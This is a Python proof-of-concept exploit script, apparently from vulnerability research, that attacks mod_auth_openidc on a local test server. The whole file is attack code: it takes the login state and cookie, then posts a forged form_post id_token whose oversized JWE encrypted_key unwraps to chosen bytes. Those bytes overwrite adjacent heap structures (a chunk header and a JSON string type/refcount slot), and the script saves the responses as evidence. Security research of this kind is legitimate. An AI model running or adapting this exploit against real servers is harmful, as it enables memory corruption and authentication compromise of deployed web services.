#!/usr/bin/env python3
"""Loopback form_post id_token with a 64-byte raw encrypted_key and chosen unwrap bytes.

The config's OIDCClientSecret derives a 16-byte OCT KEK; wrapping with that KEK
lets the RFC 3394 integrity check pass so the chosen 56-byte unwrap output
survives. Block 6 (output offsets 48..55) is the adjacent 25-byte json_string_t
type/refcount slot measured in W183; blocks 4/5 (32..47) are the next heap
chunk's header.
"""
import hashlib
import os
import re
import socket
import sys
import urllib.parse

import probe

HOST = "127.0.0.1"
PORT = 18443
UA = "w2-idtoken-chosen"
CLIENT_SECRET = "w2-loopback-secret-0123456789"
KEK = hashlib.sha256(CLIENT_SECRET.encode()).digest()[:16]
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")


def request(req):
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    return b"".join(chunks)


def save(name, data):
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(os.path.join(EVIDENCE, name), mode) as f:
        f.write(data)


def pattern(variant):
    blocks = [bytes([i + 1]) * 8 for i in range(6)]  # output offsets 0..47
    if variant == "valid":
        blocks.append(bytes.fromhex("0200000001000000"))  # JSON_STRING type=2, refcount=1
    elif variant == "invalid":
        blocks.append(b"\x5a" * 8)  # baseline: invalid type in that slot
    elif variant == "preserve":
        # cek+40..47 is the top-chunk size here (observed 0x1bd41); keep it.
        blocks[5] = bytes.fromhex("41bd010000000000")
        blocks.append(bytes.fromhex("0200000001000000"))
    else:
        raise SystemExit("BAD_VARIANT=" + variant)
    return b"".join(blocks)


def main():
    variant = sys.argv[1]
    pt = pattern(variant)
    tok = probe.token(64, kek=KEK, plaintext=pt)
    tag = "chosen64-" + variant

    get = (b"GET /private HTTP/1.1\r\n"
           b"Host: 127.0.0.1:18443\r\n"
           b"User-Agent: " + UA.encode() + b"\r\n"
           b"Accept: text/html\r\n"
           b"Connection: close\r\n\r\n")
    get_resp = request(get)
    save(tag + "-get.bin", get_resp)
    head = get_resp.split(b"\r\n\r\n", 1)[0].decode("ascii", "replace")
    m = re.search(r"[?&]state=([^&\s\"]+)", head)
    c = re.search(r"Set-Cookie:\s*(mod_auth_openidc_state_[^;]+)", head, re.I)
    if not m or not c:
        raise SystemExit("NO_STATE_OR_COOKIE: " + repr(head[:800]))
    state = urllib.parse.unquote(m.group(1))
    cookie = c.group(1)
    save(tag + "-state.txt",
         "state=%s\ncookie=%s\nplaintext=%s\nkek=%s\n" %
         (state, cookie, pt.hex(), KEK.hex()))

    body = urllib.parse.urlencode({
        "state": state,
        "id_token": tok,
        "response_mode": "form_post",
    }).encode("ascii")
    post = (b"POST /redirect_uri HTTP/1.1\r\n"
            b"Host: 127.0.0.1:18443\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Cookie: " + cookie.encode("ascii") + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n" + body)
    save(tag + "-request.bin", post)
    save(tag + "-token.txt", tok + "\n")
    resp = request(post)
    save(tag + "-post.bin", resp)

    follow = get.replace(b"User-Agent: " + UA.encode(),
                         b"User-Agent: " + UA.encode() + b"-follow")
    follow_resp = request(follow)
    save(tag + "-follow.bin", follow_resp)
    print("VARIANT=%s RAW_EK=64 PLAINTEXT=%s" % (variant, pt.hex()))
    print("GET_STATUS=" + repr(get_resp.split(b"\r\n", 1)[0]))
    print("POST_STATUS=" + repr(resp.split(b"\r\n", 1)[0]))
    print("FOLLOW_STATUS=" + repr(follow_resp.split(b"\r\n", 1)[0]))


if __name__ == "__main__":
    main()
